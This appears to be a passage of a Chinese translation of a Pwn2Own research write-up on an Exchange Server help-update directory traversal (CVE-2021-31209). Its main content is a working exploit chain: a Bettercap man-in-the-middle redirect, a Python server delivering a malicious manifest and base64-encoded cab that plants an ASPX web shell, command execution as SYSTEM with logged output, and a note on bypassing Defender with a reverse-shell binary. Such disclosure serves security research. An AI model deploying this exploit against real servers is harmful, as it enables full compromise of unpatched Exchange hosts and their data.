    function onRequest(req, res) {
        log_info("(+) triggering mitm");
        var uri = req.Scheme + "://" +req.Hostname + req.Path + "?" + req.Query;
        if (uri === "http://go.microsoft.com/fwlink/p/?LinkId=287244"){
            res.Status = 302;
            res.SetHeader("Location", "http://192.168.0.56:8000/poc.xml");
        }
    }
这个`poc.xml`清单文件包含承载恶意cab文件的`CabinetUrl`，以及更新的目标版本范围:
          15.2.1.1-15.2.999.9
          1
          en
          http://192.168.0.56:8000/poc.cab
我将manifest和`poc.cab`文件传递过程打包到一个小型python
http服务器poc.py中，该服务器也将尝试访问`poc.aspx`文件，并以SYSTEM的形式执行命令:
    import sys
    import base64
    import urllib3
    import requests
    from threading import Thread
    from http.server import HTTPServer, SimpleHTTPRequestHandler
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    class CabRequestHandler(SimpleHTTPRequestHandler):
        def log_message(self, format, *args):
            return
        def do_GET(self):
            if self.path.endswith("poc.xml"):
                print("(+) delivering xml file...")
                xml = """
          15.2.1.1-15.2.999.9
          %s
          en
          http://%s:8000/poc.cab
    """ % (r, s)
                self.send_response(200)
                self.send_header('Content-Type', 'application/xml')
                self.send_header("Content-Length", len(xml))
                self.end_headers()
                self.wfile.write(str.encode(xml))
            elif self.path.endswith("poc.cab"):
                print("(+) delivering cab file...")
                # created like: makecab /d "CabinetName1=poc.cab" /f files.txt
                # files.txt contains: "poc.aspx" "../../../../../../../inetpub/wwwroot/aspnet_client/poc.aspx"
                # poc.aspx contains:  
                stage_2  = "TVNDRgAAAAC+AAAAAAAAACwAAAAAAAAAAwEBAAEAAAAPEwAAeAAAAAEAAQA6AAAA"
                stage_2 += "AAAAAAAAZFFsJyAALi4vLi4vLi4vLi4vLi4vLi4vLi4vaW5ldHB1Yi93d3dyb290"
                stage_2 += "L2FzcG5ldF9jbGllbnQvcG9jLmFzcHgARzNy0T4AOgBDS7NRtQ2uLC5JzdVzyUxM"
                stage_2 += "z8svLslMLtYLKMpPTi0u1gsuSSwq0VBKzk1R0lEISi0sTS0uiVZKVorVVLUDAA=="
                p = base64.b64decode(stage_2.encode('utf-8'))
                self.send_response(200)
                self.send_header('Content-Type', 'application/x-cab')
                self.send_header("Content-Length", len(p))
                self.end_headers()
                self.wfile.write(p)
                return
    if __name__ == '__main__':
        if len(sys.argv) != 5:
            print("(+) usage: %s    " % sys.argv[0])
            print("(+) eg: %s 192.168.0.142 192.168.0.56 1337 mspaint" % sys.argv[0])
            print("(+) eg: %s 192.168.0.142 192.168.0.56 1337 \"whoami > c:/poc.txt\"" % sys.argv[0])
            sys.exit(-1)
        t = sys.argv[1]
        s = sys.argv[2]
        port = 8000
        r = sys.argv[3]
        c = sys.argv[4]
        print("(+) server bound to port %d" % port)
        print("(+) targeting: %s using cmd: %s" % (t, c))
        httpd = HTTPServer(('0.0.0.0', int(port)), CabRequestHandler)
        handlerthr = Thread(target=httpd.serve_forever, args=())
        handlerthr.daemon = True
        handlerthr.start()
        p = { "c" : "/c %s" % c }
        try:
            while 1:
                req = requests.get("https://%s/aspnet_client/poc.aspx" % t, params=p, verify=False)
                if req.status_code == 200:
                    break
            print("(+) executed %s as SYSTEM!" % c)
        except KeyboardInterrupt:
            pass
在每次攻击尝试中，修订号都需要增加，因为代码将把该值写入到注册表中，并在下载manifest文件后，将在继续下载和提取cab文件之前验证文件是否包含更高的修订号。
### 绕过Windows Defender
对于Pwn2Own，我们需要一个绕过 Defender的shell。在Orange Tsai泄露了他的代理登录漏洞的细节后，微软决定尝试检测asp.net
web
shell。所以我采用了与Orange不同的方法:编译一个自定义二进制文件，执行一个反向shell，并将其放到磁盘上，然后执行它来绕过Defender。
### 攻击样例
我们首先使用`poc.cap`caplet 文件运行 Bettercap ：
    researcher@pluto:~/poc-exchange$ sudo bettercap -caplet poc.cap
    bettercap v2.28 (built for linux amd64 with go1.13.12) [type 'help' for a list of commands]
    [12:23:13] [sys.log] [inf] Exchange Server CabUtility ExtractCab Directory Traversal Remote Code Execution Vulnerability
    [12:23:13] [sys.log] [inf] Found by Steven Seeley of Source Incite
    [12:23:13] [sys.log] [inf] http.proxy enabling forwarding.
    [12:23:13] [sys.log] [inf] http.proxy started on 192.168.0.56:8080 (sslstrip disabled)
现在我们 ping 目标（更新目标缓存的 Arp 表）并运行`poc.py`并等待管理用户运行`Update-ExchangeHelp`或`Update-ExchangeHelp -Force`在 Exchange 管理控制台 (EMC) 中运行（如果在最近24小时内执行过`Update-ExchangeHelp`命令，则必须执行`-Force`命令）：
    researcher@pluto:~/poc-exchange$ ./poc.py 
    (+) usage: ./poc.py    
    (+) eg: ./poc.py 192.168.0.142 192.168.0.56 1337 mspaint
    (+) eg: ./poc.py 192.168.0.142 192.168.0.56 1337 "whoami > c:/poc.txt"
    researcher@pluto:~/poc-exchange$ ./poc.py 192.168.0.142 192.168.0.56 1337 mspaint
    (+) server bound to port 8000
    (+) targeting: 192.168.0.142 using cmd: mspaint
    (+) delivering xml file...
    (+) delivering cab file...
    (+) executed mspaint as SYSTEM!
### 结论
这不是第一次[在 Pwn2Own 上使用 MiTM
攻击](https://www.zerodayinitiative.com/advisories/ZDI-20-705/)，很高兴找到一个与比赛中其他研究人员没有冲突的漏洞。这只能通过寻找新的媒介和/或表面来寻找
Exchange Server
中的漏洞才能实现。逻辑漏洞总是很有趣，因为它总是意味着能被利用，而这些相同的问题很难用传统的自动化工具发现。有人认为，所有网络漏洞实际上都是合乎逻辑的。即使是基于
Web 的注入漏洞，因为它们不需要操作内存，并且可以临时重复攻击。
此漏洞在 Exchange 服务器中的影响非常大，因为 EMC 通过 PS-Remoting 连接到配置为以 SYSTEM 身份运行的 IIS 服务。对于
SharePoint 命令行管理程序 (SMS) 直接影响的 SharePoint Server，情况并非如此，在用户运行 SMS 时实现代码执行。
Microsoft 将此问题修补为[CVE-2021-31209](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31209)，如果您尚未部署该补丁，我们建议您立即部署。
### 参考
  * 
  * 